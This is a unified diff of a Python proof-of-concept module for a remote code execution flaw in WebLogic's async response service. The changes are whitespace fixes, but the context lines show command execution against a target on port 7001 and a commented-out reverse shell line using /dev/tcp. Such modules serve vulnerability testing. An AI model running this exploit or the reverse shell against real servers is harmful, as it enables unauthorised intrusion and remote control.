@@ -97,6 +97,7 @@ class TestPOC(POCBase):
             rce_result = req.post(vul_url, verify=False,
                                   headers=headers, data=body).content
             return rce_result
+
         def poc_from_wls_v10(cmd):
             headers = {
                 "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
@@ -160,7 +161,7 @@ xmlns:asy="http://www.bea.com/async/AsyncResponseService">
                 "Content-type": "text/xml"
             }
             sent_poc = req.post(vul_url, headers=sent_poc_header, data=payload)
-            if sent_poc.status_code == 202 : 
+            if sent_poc.status_code == 202:
                 result['VerifyInfo'] = {}
                 result['VerifyInfo']['URL'] = self.url
                 result['VerifyInfo']['cmd'] = cmd
@@ -173,7 +174,7 @@ xmlns:asy="http://www.bea.com/async/AsyncResponseService">
             base_url = self.url + ":7001"
         if 'cmd' not in self.params:
             logger.log(CUSTOM_LOGGING.SYSINFO,
-                           "You can use --extra-params=\"{'cmd': 'xxx'}\" to exec command")
+                       "You can use --extra-params=\"{'cmd': 'xxx'}\" to exec command")
             cmd = 'ls'
             # cmd = "bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1"
         else:
@@ -182,7 +183,7 @@ xmlns:asy="http://www.bea.com/async/AsyncResponseService">
         try:
             poc_from_wls_v12(base_cmd)
             if ("bin" and "server")in poc_from_wls_v12(base_cmd):
-                result['VerifyInfo'] = {} 
+                result['VerifyInfo'] = {}
                 result['VerifyInfo']['URL'] = self.url
                 result['VerifyInfo']['cmd'] = "ls"
                 result['VerifyInfo']['result'] = poc_from_wls_v12(base_cmd)
@@ -191,8 +192,8 @@ xmlns:asy="http://www.bea.com/async/AsyncResponseService">
                 result['VerifyInfo']['result'] = poc_from_wls_v12(cmd)
         except Exception as e:
             poc_from_wls_v10(base_cmd)
-            if ("bin" and "server")in poc_from_wls_v10(base_cmd) :
-                result['VerifyInfo'] = {} 
+            if ("bin" and "server")in poc_from_wls_v10(base_cmd):
+                result['VerifyInfo'] = {}
                 result['VerifyInfo']['URL'] = self.url
                 result['VerifyInfo']['cmd'] = "ls"
                 result['VerifyInfo']['result'] = poc_from_wls_v10(base_cmd)
